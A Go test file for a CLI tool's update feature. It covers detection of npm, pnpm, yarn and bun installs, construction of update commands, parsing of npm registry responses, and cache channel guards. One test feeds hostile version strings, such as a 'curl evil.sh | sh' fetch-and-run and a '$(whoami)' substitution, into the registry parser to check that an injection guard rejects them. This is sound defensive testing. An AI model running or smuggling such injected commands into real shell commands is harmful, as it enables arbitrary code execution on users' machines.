package cli

import (
	"bytes"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/spf13/cobra"
)

// TestIsNpmManagedPath pins the channel-detection heuristic across the real
// layouts forge binaries land in: npm/yarn/pnpm globals all place the binary
// under node_modules/@agent_forge/forge-<platform>/, while GitHub Release and
// repo-build installs must keep the GitHub channel.
//
// TestIsNpmManagedPath 钉住通道检测启发式覆盖二进制真实落位：npm/yarn/pnpm
// 全局安装都在 node_modules/@agent_forge/forge-<platform>/ 下，而 GitHub
// Release 与源码构建安装必须保持 GitHub 通道。
func TestIsNpmManagedPath(t *testing.T) {
	tests := []struct {
		name string
		path string
		want bool
	}{
		{
			name: "windows npm global platform subpackage",
			path: `C:\Users\u\AppData\Roaming\npm\node_modules\@agent_forge\forge-win32-x64\bin\forge.exe`,
			want: true,
		},
		{
			name: "unix npm global platform subpackage",
			path: `/usr/lib/node_modules/@agent_forge/forge-linux-x64/bin/forge`,
			want: true,
		},
		{
			name: "pnpm global store layout",
			path: `/home/u/.local/share/pnpm/global/5/.pnpm/@agent_forge+forge-win32-x64@1.39.1/node_modules/@agent_forge/forge-win32-x64/bin/forge.exe`,
			want: true,
		},
		{
			name: "main package layout (defensive)",
			path: `/usr/lib/node_modules/@agent_forge/forge/bin/forge`,
			want: true,
		},
		{
			name: "mixed separators windows",
			path: `C:\npm-global/node_modules/@agent_forge/forge-darwin-arm64/bin/forge`,
			want: true,
		},
		{
			name: "github release install",
			path: `C:\Tools\forge\forge.exe`,
			want: false,
		},
		{
			name: "repo build",
			path: `/home/u/Forge/forge`,
			want: false,
		},
		{
			name: "foreign scope",
			path: `/usr/lib/node_modules/@other/forge-win32-x64/bin/forge`,
			want: false,
		},
		{
			name: "agent_forge package that is not forge",
			path: `/usr/lib/node_modules/@agent_forge/other-cli/bin/forge`,
			want: false,
		},
		{
			name: "scope-like prefix not exact segment",
			path: `/usr/lib/node_modules/@agent_forge-extra/forge/bin/forge`,
			want: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := isNpmManagedPath(tt.path); got != tt.want {
				t.Errorf("isNpmManagedPath(%q) = %v, want %v", tt.path, got, tt.want)
			}
		})
	}
}

// TestPackageManagerForPath pins the manager inference: pnpm/yarn layouts must
// map to their own commands — pointing a pnpm user at npm creates a second
// parallel forge on PATH (the stray-exe mess this split exists to prevent).
//
// TestPackageManagerForPath 钉住包管理器推断：pnpm/yarn 布局必须映射到各自
// 命令——给 pnpm 用户指 npm 会在 PATH 上装出第二份平行 forge（正是本次
// 分流要消灭的游离 exe 问题）。
func TestPackageManagerForPath(t *testing.T) {
	tests := []struct {
		name string
		path string
		want string
	}{
		{
			name: "pnpm global store",
			path: `/home/u/.local/share/pnpm/global/5/.pnpm/@agent_forge+forge-win32-x64@1.39.1/node_modules/@agent_forge/forge-win32-x64/bin/forge.exe`,
			want: "pnpm",
		},
		{
			name: "pnpm global windows",
			path: `C:\Users\u\AppData\Local\pnpm\global\5\node_modules\@agent_forge\forge-win32-x64\bin\forge.exe`,
			want: "pnpm",
		},
		{
			name: "yarn global unix (dot dir)",
			path: `/home/u/.yarn/global/node_modules/@agent_forge/forge-linux-x64/bin/forge`,
			want: "yarn",
		},
		{
			name: "yarn global windows (capital, no dot)",
			path: `C:\Users\u\AppData\Local\Yarn\global\node_modules\@agent_forge\forge-win32-x64\bin\forge.exe`,
			want: "yarn",
		},
		{
			name: "bun global",
			path: `/home/u/.bun/install/global/node_modules/@agent_forge/forge-linux-x64/bin/forge`,
			want: "bun",
		},
		{
			name: "volta-wrapped npm stays npm",
			path: `/home/u/.volta/tools/image/packages/@agent_forge/lib/node_modules/@agent_forge/forge-linux-x64/bin/forge`,
			want: "npm",
		},
		{
			name: "npm global windows",
			path: `C:\Users\u\AppData\Roaming\npm\node_modules\@agent_forge\forge-win32-x64\bin\forge.exe`,
			want: "npm",
		},
		{
			name: "npm global unix",
			path: `/usr/lib/node_modules/@agent_forge/forge-linux-x64/bin/forge`,
			want: "npm",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := packageManagerForPath(tt.path); got != tt.want {
				t.Errorf("packageManagerForPath(%q) = %q, want %q", tt.path, got, tt.want)
			}
		})
	}
}

func TestNpmUpdateCommand(t *testing.T) {
	tests := []struct {
		pm   string
		want string
	}{
		{"npm", "npm install -g @agent_forge/forge@1.40.0"},
		{"pnpm", "pnpm add -g @agent_forge/forge@1.40.0"},
		{"yarn", "yarn global add @agent_forge/forge@1.40.0"},
		{"bun", "bun add -g @agent_forge/forge@1.40.0"},
		{"", "npm install -g @agent_forge/forge@latest"},
	}
	for _, tt := range tests {
		spec := "1.40.0"
		if tt.pm == "" {
			spec = "latest"
		}
		if got := npmUpdateCommand(tt.pm, spec); got != tt.want {
			t.Errorf("npmUpdateCommand(%q, %q) = %q, want %q", tt.pm, spec, got, tt.want)
		}
	}
}

// TestGetLatestVersionFromNPM pins the registry document parsing via a local
// test server. The server mirrors the real registry's /latest behavior of
// answering the abbreviated-manifest Accept type with 406 (verified
// out-of-band against registry.npmjs.org 2026-08-21), so the Accept header
// is enforced here, not just observed.
//
// TestGetLatestVersionFromNPM 用本地测试服务器钉住 registry 文档解析。
// 服务器复刻真实 registry /latest 端点对缩略 manifest Accept 类型回 406 的
// 行为（2026-08-21 对 registry.npmjs.org 带外实测），故 Accept 头在这里
// 是被强制执行的，不只是被看见。
func TestGetLatestVersionFromNPM(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/@agent_forge/forge/latest" {
			http.NotFound(w, r)
			return
		}
		if got := r.Header.Get("Accept"); got != "application/json" {
			w.WriteHeader(http.StatusNotAcceptable)
			_, _ = w.Write([]byte("abbreviated accept type not served on /latest"))
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"name":"@agent_forge/forge","version":"1.40.0"}`))
	}))
	defer srv.Close()

	t.Setenv("FORGE_NPM_REGISTRY", srv.URL)

	v, err := getLatestVersionFromNPM()
	if err != nil {
		t.Fatalf("getLatestVersionFromNPM failed: %v", err)
	}
	if v != "1.40.0" {
		t.Errorf("version = %q, want 1.40.0", v)
	}
}

// TestGetLatestVersionFromNPMSemverReject pins the injection guard: the
// registry-sourced version gets pasted into a copy-paste shell command, so
// metacharacters or non-semver garbage must be rejected before they reach
// the guidance output.
//
// TestGetLatestVersionFromNPMSemverReject 钉住注入防护：来自 registry 的
// version 会被拼进可复制的 shell 命令，元字符与非 semver 垃圾必须在
// 到达指引输出前被拒。
func TestGetLatestVersionFromNPMSemverReject(t *testing.T) {
	tests := []struct {
		name    string
		version string
	}{
		{"shell metacharacters", `1.40.0; curl evil.sh | sh`},
		{"command substitution", `1.40.0$(whoami)`},
		{"garbage", `latest`},
		{"empty-ish", `.`},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				w.Header().Set("Content-Type", "application/json")
				fmt.Fprintf(w, `{"name":"@agent_forge/forge","version":%q}`, tt.version)
			}))
			defer srv.Close()

			t.Setenv("FORGE_NPM_REGISTRY", srv.URL)

			if _, err := getLatestVersionFromNPM(); err == nil {
				t.Fatalf("expected semver rejection for %q, got nil", tt.version)
			}
		})
	}
}

func TestGetLatestVersionFromNPMError(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Error(w, "boom", http.StatusInternalServerError)
	}))
	defer srv.Close()

	t.Setenv("FORGE_NPM_REGISTRY", srv.URL)

	if _, err := getLatestVersionFromNPM(); err == nil {
		t.Fatal("expected error on HTTP 500, got nil")
	}
}

// TestPrintNpmUpdateGuidance pins the redirect output: the install command
// must match the detected package manager and pin the checked version so
// users can copy-paste.
//
// TestPrintNpmUpdateGuidance 钉住重定向输出：安装命令必须匹配检出的
// 包管理器并钉住查到的版本，用户可一键复制。
func TestPrintNpmUpdateGuidance(t *testing.T) {
	buf := &bytes.Buffer{}
	printNpmUpdateGuidance(buf, "1.40.0", "pnpm")
	out := buf.String()
	for _, want := range []string{"pnpm add -g @agent_forge/forge@1.40.0", "node_modules/@agent_forge"} {
		if !strings.Contains(out, want) {
			t.Errorf("指引输出缺 %q：\n%s", want, out)
		}
	}
	if strings.Contains(out, "npm install") {
		t.Errorf("pnpm 指引不得含 npm 命令（平行安装源）：\n%s", out)
	}
}

// TestPrintUpdateNotice pins the per-channel notice: npm installs are told to
// run their package manager (never `forge update`, which would just print the
// same command again), GitHub installs keep `forge update`.
//
// TestPrintUpdateNotice 钉住按通道的通知：npm 安装被告知跑自己的包管理器
// （绝不能是 `forge update`——那只会再打印一次同样的命令），GitHub 安装保持
// `forge update`。
func TestPrintUpdateNotice(t *testing.T) {
	npmBuf := &bytes.Buffer{}
	printUpdateNotice(npmBuf, "1.40.0", "1.39.1", installChannel{kind: channelNPM, pm: "npm"})
	if !strings.Contains(npmBuf.String(), "npm install -g @agent_forge/forge@latest") {
		t.Errorf("npm 通道通知应含 npm 更新命令：\n%s", npmBuf.String())
	}

	ghBuf := &bytes.Buffer{}
	printUpdateNotice(ghBuf, "1.40.0", "1.39.1", installChannel{kind: channelGitHub})
	if !strings.Contains(ghBuf.String(), "forge update") {
		t.Errorf("github 通道通知应含 forge update：\n%s", ghBuf.String())
	}
	if strings.Contains(ghBuf.String(), "npm install") {
		t.Errorf("github 通道通知不应含 npm 命令：\n%s", ghBuf.String())
	}
}

// TestRunUpdateNpmRedirect exercises the real runUpdate control flow on the
// npm channel (via the detectInstallChannelFn indirection): it must consult
// the npm registry, print the package-manager-matching guidance, write the
// channel-tagged cache, and never attempt a GitHub download.
//
// TestRunUpdateNpmRedirect 用真实 runUpdate 控制流跑 npm 通道（经
// detectInstallChannelFn 间接层）：必须查 npm registry、打印匹配包管理器
// 的指引、写带通道标记的缓存，且绝不尝试 GitHub 下载。
func TestRunUpdateNpmRedirect(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"name":"@agent_forge/forge","version":"1.40.0"}`))
	}))
	defer srv.Close()
	t.Setenv("FORGE_NPM_REGISTRY", srv.URL)

	setTestHome(t, t.TempDir())
	forceChannel(t, installChannel{kind: channelNPM, pm: "pnpm"})

	var runErr error
	out := captureStderr(t, func() {
		runErr = runUpdate(updateCmd, nil)
	})

	if runErr != nil {
		t.Fatalf("runUpdate (npm channel) failed: %v", runErr)
	}
	if !strings.Contains(out, "pnpm add -g @agent_forge/forge@1.40.0") {
		t.Errorf("npm 通道应打印 pnpm 指引（未尝试下载）：\n%s", out)
	}
	if strings.Contains(out, "下载") {
		t.Errorf("npm 通道不得进入下载流程：\n%s", out)
	}

	cache, err := loadUpdateCache()
	if err != nil {
		t.Fatalf("loadUpdateCache failed: %v", err)
	}
	if cache.LatestVersion != "1.40.0" || cache.Channel != string(channelNPM) {
		t.Errorf("cache = {%s %s}, want {1.40.0 %s}", cache.LatestVersion, cache.Channel, channelNPM)
	}
}

// TestRunUpdateNpmPluginFlag pins the --plugin contract on the npm channel:
// the marketplace-reinstall guidance must print there too, not only on the
// GitHub download path.
//
// TestRunUpdateNpmPluginFlag 钉住 npm 通道上的 --plugin 契约：marketplace
// 重装指引在这里也必须打印，不能只在 GitHub 下载路径有。
func TestRunUpdateNpmPluginFlag(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"version":"1.40.0"}`))
	}))
	defer srv.Close()
	t.Setenv("FORGE_NPM_REGISTRY", srv.URL)

	setTestHome(t, t.TempDir())
	forceChannel(t, installChannel{kind: channelNPM, pm: "npm"})
	updatePluginFlag = true
	t.Cleanup(func() { updatePluginFlag = false })

	var runErr error
	out := captureStderr(t, func() {
		runErr = runUpdate(updateCmd, nil)
	})

	if runErr != nil {
		t.Fatalf("runUpdate (npm channel, --plugin) failed: %v", runErr)
	}
	if !strings.Contains(out, "npm install -g @agent_forge/forge@1.40.0") {
		t.Errorf("应打印 npm 指引：\n%s", out)
	}
	if !strings.Contains(out, "plugin marketplace") {
		t.Errorf("--plugin 在 npm 通道也应输出重装指引：\n%s", out)
	}
}

// TestUpdateCacheChannelMismatch pins the L-2 guard: a fresh cache entry
// written by the other channel is not trusted (two-stage releases publish
// the GitHub tag before npm), while legacy channel-less entries stay usable.
//
// TestUpdateCacheChannelMismatch 钉住跨通道守卫：另一通道写的新鲜缓存条目
// 不被信任（两段式发版里 GitHub tag 先于 npm publish），无通道字段的
// 旧条目保持可用。
func TestUpdateCacheChannelMismatch(t *testing.T) {
	setTestHome(t, t.TempDir())
	if err := saveUpdateCache("1.40.0", channelGitHub); err != nil {
		t.Fatal(err)
	}
	cache, err := loadUpdateCache()
	if err != nil {
		t.Fatal(err)
	}
	if cache.matchesChannel(channelGitHub) != true {
		t.Error("同通道缓存应可用")
	}
	if cache.matchesChannel(channelNPM) != false {
		t.Error("跨通道新鲜缓存不可信（两段式发版窗口内版本可能不一致）")
	}
	legacy := updateCache{LatestVersion: "1.40.0", CheckedAt: "2026-08-21T00:00:00Z"}
	if legacy.matchesChannel(channelNPM) != true {
		t.Error("旧格式（无 Channel 字段）缓存应保持可用")
	}
}

// forceChannel overrides the channel-detection indirection for the test and
// restores it on cleanup.
//
// forceChannel 为测试覆写通道检测间接层，cleanup 时还原。
func forceChannel(t *testing.T, ch installChannel) {
	t.Helper()
	orig := detectInstallChannelFn
	detectInstallChannelFn = func() installChannel { return ch }
	t.Cleanup(func() { detectInstallChannelFn = orig })
}

// TestCheckForUpdateNpmChannelRequery pins the cross-channel cache guard end
// to end: a fresh cache entry written by the GitHub channel (which sees the
// tag before the npm publish in a two-stage release) must not satisfy an
// npm-channel check — the check re-queries the npm registry, notifies with
// the npm command, and overwrites the cache with its own channel tag.
//
// TestCheckForUpdateNpmChannelRequery 端到端钉住跨通道缓存守卫：GitHub
// 通道写的新鲜缓存条目（两段式发版里先见到 tag）不得满足 npm 通道的
// 检查——须重查 npm registry、用 npm 命令发通知、并以本通道标签覆写
// 缓存。
func TestCheckForUpdateNpmChannelRequery(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"name":"@agent_forge/forge","version":"1.40.0"}`))
	}))
	defer srv.Close()
	t.Setenv("FORGE_NPM_REGISTRY", srv.URL)

	setTestHome(t, t.TempDir())
	forceChannel(t, installChannel{kind: channelNPM, pm: "npm"})

	// Fresh cache entry from the OTHER channel (e.g. a GitHub-channel forge
	// on the same machine saw 1.41.0 land as a tag before npm published it).
	//
	// 来自另一通道的新鲜缓存条目（如同机 GitHub 通道 forge 在 npm publish
	// 前先见到 1.41.0 tag 落地）。
	if err := saveUpdateCache("1.41.0", channelGitHub); err != nil {
		t.Fatal(err)
	}

	cmd := &cobra.Command{Use: "status"}
	out := captureStderr(t, func() {
		checkForUpdate("1.39.1 (commit: abc, built: 2026-08-21)", cmd)
	})

	// The stale cross-channel 1.41.0 must NOT be notified; the npm-registry
	// answer (1.40.0) must be, with the npm command.
	//
	// 不得通知跨通道的陈旧 1.41.0；必须通知 npm registry 的答案（1.40.0），
	// 且命令是 npm 的。
	if strings.Contains(out, "1.41.0") {
		t.Errorf("跨通道缓存条目不得直接通知：\n%s", out)
	}
	if !strings.Contains(out, "Forge 1.40.0 可用") || !strings.Contains(out, "npm install -g @agent_forge/forge@latest") {
		t.Errorf("应重查 npm registry 并以 npm 命令通知：\n%s", out)
	}

	cache, err := loadUpdateCache()
	if err != nil {
		t.Fatal(err)
	}
	if cache.LatestVersion != "1.40.0" || cache.Channel != string(channelNPM) {
		t.Errorf("cache = {%s %s}, want {1.40.0 %s}（本通道覆写）", cache.LatestVersion, cache.Channel, channelNPM)
	}
}
